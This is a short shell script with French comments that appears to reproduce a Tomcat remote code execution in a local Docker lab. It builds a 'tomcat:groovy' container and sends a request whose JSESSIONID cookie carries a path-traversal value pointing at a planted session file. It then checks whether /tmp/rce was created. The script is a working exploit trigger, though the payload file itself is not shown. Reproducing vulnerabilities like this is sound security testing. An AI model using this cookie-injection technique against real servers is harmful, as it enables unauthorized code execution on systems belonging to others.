#!/bin/sh

# On build puis lance le container avec le serveur tomcat
docker build -t tomcat:groovy .
docker run -d -p 8080:8080 tomcat:groovy
sleep 3

# Envoie de la requête
curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'

#Vérification de la création de /tmp/rce 
var=$(docker container ls -q --filter "ancestor=tomcat:groovy")
echo "\n"
docker exec -t -i $var /bin/ls "/tmp/rce"